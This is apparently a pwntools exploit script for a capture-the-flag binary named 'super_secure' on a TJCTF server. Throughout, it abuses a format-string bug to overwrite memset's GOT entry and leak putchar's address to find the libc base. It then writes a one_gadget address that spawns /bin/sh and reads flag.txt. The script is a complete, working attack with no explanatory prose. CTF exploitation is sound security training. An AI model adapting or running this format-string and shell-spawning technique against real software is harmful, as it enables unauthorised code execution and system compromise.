#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64


__LIBC__ = "/lib/x86_64-linux-gnu/libc-2.23.so"
__NAME__ = "super_secure"
__REMOTE__ = "problem1.tjctf.org"
__REMOTE_PORT__ = 8009
__GDB__ = """
c
"""

context.arch = 'amd64'

if __name__ == "__main__":

	log.info("pwning %s"  % __NAME__)


	if args.REMOTE:

		log.info("remote run")
		r = remote(__REMOTE__, __REMOTE_PORT__)
		__LIBC__ = "./libc-2.27.so"

	else:

		log.info("local run")

		if args.GDB:

			if args.GDB == 'attach':

				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})
				log.info("attaching gdb...")
				gdb.attach(r.pid, __GDB__)	

			else:

				r = gdb.debug("./%s" % __NAME__, __GDB__)
		else:

			r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})

    # s - Store your secret message
    # v - View your secret message
    # u - Upgrade to premium
    # h - Display this help menu
    # x - Exit service

	r.sendlineafter("> ", "s") # store
	r.sendlineafter("Message Password:\n", "p"*0x1f)

	b = ELF("./%s" % __NAME__)

	ms = b.got["memset"]

	payload = "%3488c%33$hn%62112c%34$hn%65472c%35$hn%36$hn___%37$s----"
	          
	payload += p64(ms) + p64(ms + 2) + p64(ms + 4) + p64(ms + 5)
	payload += p64(b.got["putchar"])

	r.sendlineafter("Secret Message:\n", payload)

	r.sendlineafter("> ", "")
	r.sendlineafter("> ", "v")
	r.sendafter("Message Password:\n", "p"*0x20)

	r.recvuntil("___")
	putchar = r.recvn(6)
	putchar = unpack("<Q", putchar.ljust(8, "\x00"))[0]
	log.info("putchar() @ 0x%x" % putchar)

	libc = ELF(__LIBC__)
	libc.address = putchar - libc.symbols['putchar']
	log.info("libcBase = 0x%x" % libc.address)

	# one_gadget:	
	# 0x4f322	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# [rsp+0x40] == NULL

	p = fmtstr_payload(33, {0x602050: 0x4f322+libc.address}, write_size='short', numbwritten=-8*4)

	p1 = p[:8*4]
	p2 = p[8*4:]

	p0 = "%-56s" % p2 + p1

	log.info("payload: %s" % repr(p0))

	r.sendlineafter("Captcha: ", "")

	r.sendlineafter("> ", "s") # store
	r.sendlineafter("Message Password:\n", "p"*0x1f)
	r.sendlineafter("Secret Message:\n", p0)

	r.sendlineafter("> ", "")
	r.sendlineafter("> ", "v")
	r.sendafter("Message Password:\n", "p"*0x20)
	r.sendlineafter("Captcha: ", "")

	r.sendline("ls")
	r.sendline("cat flag.txt")
	r.interactive()

